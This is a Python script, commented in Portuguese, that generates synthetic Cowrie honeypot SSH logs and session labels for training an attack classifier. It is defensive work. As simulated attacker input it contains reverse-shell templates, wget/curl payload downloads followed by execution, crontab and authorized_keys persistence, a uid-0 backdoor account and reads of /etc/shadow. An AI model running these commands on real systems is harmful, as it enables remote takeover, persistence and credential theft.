"""
Gerador de logs sintéticos no formato JSON do Cowrie.

Produz dois arquivos:
  - cowrie_logs.jsonl     : eventos brutos (formato idêntico ao Cowrie real)
  - session_labels.csv    : session_id → classe do ataque (para treino supervisionado)

Classes geradas:
  brute_force        — força bruta SSH sem acesso ao shell
  command_injection  — login bem-sucedido seguido de reverse shell / payload
  recon              — enumeração passiva do sistema (sem payload)
  malware_download   — download e execução de malware via wget/curl
"""

import json
import random
import uuid
from datetime import datetime, timedelta
from pathlib import Path

# ── wordlists ────────────────────────────────────────────────────────────────

USERNAMES = [
    "root", "admin", "user", "ubuntu", "oracle", "postgres", "test", "guest",
    "pi", "vagrant", "hadoop", "jenkins", "git", "deploy", "www", "mysql",
    "ftpuser", "support", "tomcat", "ec2-user", "ansible", "nagios", "redis",
]

PASSWORDS = [
    "123456", "password", "admin", "root", "1234", "qwerty", "12345678",
    "letmein", "monkey", "dragon", "master", "pass123", "admin123", "toor",
    "changeme", "default", "pass", "test", "abc123", "Password1", "p@ssw0rd",
    "rootroot", "alpine", "raspberry", "ubuntu", "vagrant", "1q2w3e4r",
]

SSH_CLIENTS = [
    "SSH-2.0-libssh-0.9.3", "SSH-2.0-OpenSSH_7.9", "SSH-2.0-Go",
    "SSH-2.0-JSCH-0.1.55", "SSH-2.0-libssh2_1.9.0", "SSH-2.0-OpenSSH_8.9p1",
    "SSH-2.0-paramiko_2.11.0", "SSH-2.0-RomSSH", "SSH-2.0-OpenSSH_9.0p1",
]

RECON_CMDS = [
    "uname -a", "id", "whoami", "hostname", "cat /etc/passwd",
    "cat /etc/shadow", "ls -la /", "ps aux", "netstat -antp",
    "ifconfig", "ip a", "cat /proc/cpuinfo", "df -h", "free -m",
    "ls /home", "cat /etc/os-release", "env", "last", "who",
    "ls /var/log", "cat /etc/crontab",
]

MALWARE_URLS = [
    "http://45.33.32.156/bot.sh",
    "http://192.241.205.159/payload",
    "http://178.128.23.9/miner",
    "http://134.209.82.17/setup.sh",
    "http://165.22.123.45/install.sh",
]

REVERSE_SHELL_TEMPLATES = [
    "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc -e /bin/sh {ip} {port}",
    "/bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1",
    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
]

# ── helpers ──────────────────────────────────────────────────────────────────

def _ip() -> str:
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


def _ts(base: datetime, offset_ms: float) -> str:
    return (base + timedelta(milliseconds=offset_ms)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _ev(eventid: str, session: str, ts: str, src_ip: str, **kw) -> dict:
    return {"eventid": eventid, "session": session, "timestamp": ts,
            "src_ip": src_ip, "sensor": "cowrie", **kw}


def _truncate(events: list) -> list:
    """Corta a sessao logo apos o handshake, mantendo o evento de fechamento.

    Reproduz o scanner que conecta, negocia a versao e desiste — o padrao mais
    comum em trafego real e o unico que NAO existia no dataset sintetico. Foi
    exatamente esse caso que o modelo classificou errado em producao
    (sessao sem login e sem comando rotulada como brute_force).
    """
    head = [e for e in events if e["eventid"] in
            ("cowrie.session.connect", "cowrie.client.version")]
    return head + [events[-1]]

# ── geradores por classe ──────────────────────────────────────────────────────

def gen_brute_force(base: datetime, noise: float = 0.0) -> list:
    """Muitas tentativas de login rápidas, sem acesso ao shell."""
    sid = uuid.uuid4().hex[:12]
    ip = _ip()
    t = 0.0
    ev = []

    ev.append(_ev("cowrie.session.connect", sid, _ts(base, t), ip,
                  src_port=random.randint(30000, 65535), dst_port=22))
    t += random.uniform(80, 200)
    ev.append(_ev("cowrie.client.version", sid, _ts(base, t), ip,
                  version=random.choice(SSH_CLIENTS)))

    usernames = random.sample(USERNAMES, random.randint(3, 8))
    # Ruido: campanhas curtas (poucas tentativas) sao comuns e se confundem
    # com o preambulo de command_injection/malware_download.
    n_attempts = (random.randint(4, 20) if random.random() < 0.30 * noise
                  else random.randint(60, 300))
    for _ in range(n_attempts):
        t += random.uniform(80, 600)
        ev.append(_ev("cowrie.login.failed", sid, _ts(base, t), ip,
                      username=random.choice(usernames),
                      password=random.choice(PASSWORDS)))

    # Ruido: parte das campanhas efetivamente acerta a senha e encerra sem
    # executar nada — fica indistinguivel de um recon que desistiu.
    if random.random() < 0.25 * noise:
        t += random.uniform(200, 800)
        ev.append(_ev("cowrie.login.success", sid, _ts(base, t), ip,
                      username=random.choice(usernames),
                      password=random.choice(PASSWORDS)))

    t += random.uniform(100, 400)
    ev.append(_ev("cowrie.session.closed", sid, _ts(base, t), ip,
                  duration=round(t / 1000, 3)))
    return ev


def gen_command_injection(base: datetime, noise: float = 0.0) -> list:
    """Poucos erros de login, acesso, depois reverse shell ou payload malicioso."""
    sid = uuid.uuid4().hex[:12]
    ip = _ip()
    atk_ip = _ip()
    atk_port = random.randint(1024, 9999)
    t = 0.0
    ev = []

    ev.append(_ev("cowrie.session.connect", sid, _ts(base, t), ip,
                  src_port=random.randint(30000, 65535), dst_port=22))
    t += random.uniform(100, 300)
    ev.append(_ev("cowrie.client.version", sid, _ts(base, t), ip,
                  version=random.choice(SSH_CLIENTS)))

    for _ in range(random.randint(1, 5)):
        t += random.uniform(800, 3000)
        ev.append(_ev("cowrie.login.failed", sid, _ts(base, t), ip,
                      username="root", password=random.choice(PASSWORDS)))

    t += random.uniform(400, 1200)
    ev.append(_ev("cowrie.login.success", sid, _ts(base, t), ip,
                  username="root", password=random.choice(PASSWORDS[:6])))

    for cmd in random.sample(RECON_CMDS[:6], random.randint(2, 4)):
        t += random.uniform(2000, 8000)
        ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=cmd))

    # Ruido: nem toda injecao usa reverse shell. Persistencia via crontab ou
    # chave SSH remove justamente a feature mais discriminativa da classe.
    if random.random() < 0.30 * noise:
        shell = random.choice([
            f"echo '* * * * * root {random.choice(MALWARE_URLS)}' >> /etc/crontab",
            "echo 'ssh-rsa AAAAB3Nza...' >> /root/.ssh/authorized_keys",
            "useradd -ou 0 -g 0 svc && echo 'svc:svc' | chpasswd",
        ])
    else:
        shell = random.choice(REVERSE_SHELL_TEMPLATES).format(ip=atk_ip, port=atk_port)
    t += random.uniform(3000, 12000)
    ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=shell))

    t += random.uniform(10000, 60000)
    ev.append(_ev("cowrie.session.closed", sid, _ts(base, t), ip,
                  duration=round(t / 1000, 3)))
    return ev


def gen_recon(base: datetime, noise: float = 0.0) -> list:
    """Login bem-sucedido seguido de enumeração passiva do sistema."""
    sid = uuid.uuid4().hex[:12]
    ip = _ip()
    t = 0.0
    ev = []

    ev.append(_ev("cowrie.session.connect", sid, _ts(base, t), ip,
                  src_port=random.randint(30000, 65535), dst_port=22))
    t += random.uniform(100, 400)
    ev.append(_ev("cowrie.client.version", sid, _ts(base, t), ip,
                  version=random.choice(SSH_CLIENTS)))

    for _ in range(random.randint(0, 3)):
        t += random.uniform(600, 2500)
        ev.append(_ev("cowrie.login.failed", sid, _ts(base, t), ip,
                      username=random.choice(USERNAMES[:6]),
                      password=random.choice(PASSWORDS)))

    t += random.uniform(300, 1000)
    ev.append(_ev("cowrie.login.success", sid, _ts(base, t), ip,
                  username=random.choice(["root", "admin"]),
                  password=random.choice(PASSWORDS)))

    for cmd in random.sample(RECON_CMDS, random.randint(6, len(RECON_CMDS))):
        t += random.uniform(3000, 20000)
        ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=cmd))

    # Ruido: recon frequentemente baixa uma ferramenta de enumeracao
    # (linpeas, pspy). Dispara has_wget_curl sem ser malware_download.
    if random.random() < 0.30 * noise:
        t += random.uniform(2000, 6000)
        tool = random.choice(["linpeas.sh", "pspy64", "lse.sh"])
        ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip,
                      input=f"curl -s http://{_ip()}/{tool} -o /tmp/{tool}"))

    t += random.uniform(5000, 15000)
    ev.append(_ev("cowrie.session.closed", sid, _ts(base, t), ip,
                  duration=round(t / 1000, 3)))
    return ev


def gen_malware_download(base: datetime, noise: float = 0.0) -> list:
    """Login bem-sucedido, wget/curl para baixar e executar payload."""
    sid = uuid.uuid4().hex[:12]
    ip = _ip()
    t = 0.0
    ev = []

    ev.append(_ev("cowrie.session.connect", sid, _ts(base, t), ip,
                  src_port=random.randint(30000, 65535), dst_port=22))
    t += random.uniform(100, 300)
    ev.append(_ev("cowrie.client.version", sid, _ts(base, t), ip,
                  version=random.choice(SSH_CLIENTS)))

    for _ in range(random.randint(0, 4)):
        t += random.uniform(500, 2000)
        ev.append(_ev("cowrie.login.failed", sid, _ts(base, t), ip,
                      username=random.choice(USERNAMES[:8]),
                      password=random.choice(PASSWORDS)))

    t += random.uniform(300, 1000)
    ev.append(_ev("cowrie.login.success", sid, _ts(base, t), ip,
                  username=random.choice(["root", "admin", "ubuntu"]),
                  password=random.choice(PASSWORDS)))

    for cmd in random.sample(RECON_CMDS[:6], random.randint(1, 3)):
        t += random.uniform(1000, 5000)
        ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=cmd))

    url = random.choice(MALWARE_URLS)
    outfile = f"/tmp/.{uuid.uuid4().hex[:6]}"
    tool = random.choice(["wget", "curl"])
    download_cmd = (
        f"wget {url} -O {outfile}" if tool == "wget"
        else f"curl -s {url} -o {outfile}"
    )

    t += random.uniform(2000, 8000)
    ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip, input=download_cmd))
    t += random.uniform(500, 3000)
    ev.append(_ev("cowrie.session.file_download", sid, _ts(base, t), ip,
                  url=url, outfile=outfile, shasum=uuid.uuid4().hex))

    t += random.uniform(500, 2000)
    ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip,
                  input=f"chmod +x {outfile} && {outfile}"))

    # Ruido: dropper que tambem abre canal de retorno — sobrepoe com
    # command_injection, que e o caso real de botnets tipo Mirai.
    if random.random() < 0.25 * noise:
        t += random.uniform(1000, 4000)
        ev.append(_ev("cowrie.command.input", sid, _ts(base, t), ip,
                      input=random.choice(REVERSE_SHELL_TEMPLATES).format(
                          ip=_ip(), port=random.randint(1024, 9999))))

    t += random.uniform(5000, 60000)
    ev.append(_ev("cowrie.session.closed", sid, _ts(base, t), ip,
                  duration=round(t / 1000, 3)))
    return ev


# ── orquestrador ─────────────────────────────────────────────────────────────

ATTACK_GENERATORS = {
    "brute_force":        gen_brute_force,
    "command_injection":  gen_command_injection,
    "recon":              gen_recon,
    "malware_download":   gen_malware_download,
}


def generate_dataset(
    logs_path: str,
    labels_path: str,
    sessions_per_class: int = 500,
    seed: int = 42,
    noise: float = 0.0,
) -> None:
    """Gera o dataset sintetico.

    `noise` (0.0 a 1.0) controla quanta ambiguidade e injetada. Em 0.0 as
    classes sao perfeitamente separaveis por tres flags binarias
    (login_success / has_reverse_shell / has_wget_curl), o que produz
    F1-macro = 1.0 — um resultado que mede a capacidade do modelo de
    reconstruir o if/else do gerador, nao de reconhecer ataques. Valores
    maiores criam sobreposicao entre classes, sessoes truncadas e erro de
    rotulagem, aproximando o dataset do trafego real.
    """
    random.seed(seed)
    Path(logs_path).parent.mkdir(parents=True, exist_ok=True)

    base = datetime(2025, 1, 1)
    all_sessions = []  # [(session_id, label, events)]

    for label, gen_fn in ATTACK_GENERATORS.items():
        print(f"  {label:<22} {sessions_per_class} sessões")
        for i in range(sessions_per_class):
            offset = timedelta(hours=i * 0.5 + random.uniform(0, 0.4))
            events = gen_fn(base + offset, noise)
            # Sessao abortada logo apos o handshake — vale para qualquer
            # classe e e o padrao dominante em trafego real.
            if random.random() < 0.15 * noise:
                events = _truncate(events)
            all_sessions.append((events[0]["session"], label, events))

    # Ruido de rotulagem: mesmo anotacao humana erra, e o dataset nao deve
    # fingir que o ground truth e perfeito.
    if noise:
        labels_pool = list(ATTACK_GENERATORS)
        n_flip = int(len(all_sessions) * 0.05 * noise)
        for idx in random.sample(range(len(all_sessions)), n_flip):
            sid, label, events = all_sessions[idx]
            wrong = random.choice([c for c in labels_pool if c != label])
            all_sessions[idx] = (sid, wrong, events)
        if n_flip:
            print(f"  {'(rotulos trocados)':<22} {n_flip} sessões")

    random.shuffle(all_sessions)  # intercala como log real faria

    total_events = 0
    with (
        open(logs_path, "w", encoding="utf-8") as f_logs,
        open(labels_path, "w", encoding="utf-8") as f_labels,
    ):
        f_labels.write("session_id,label\n")
        for sid, label, events in all_sessions:
            f_labels.write(f"{sid},{label}\n")
            for ev in events:
                f_logs.write(json.dumps(ev) + "\n")
                total_events += 1

    print(f"\n  -> {logs_path}")
    print(f"     {total_events} eventos  |  {len(all_sessions)} sessoes  |  {len(ATTACK_GENERATORS)} classes")


if __name__ == "__main__":
    print("Gerando logs sintéticos do Cowrie...\n")
    generate_dataset(
        logs_path="../data/dataset/cowrie_logs.jsonl",
        labels_path="../data/dataset/session_labels.csv",
        sessions_per_class=500,
    )
    print("\nConcluído.")
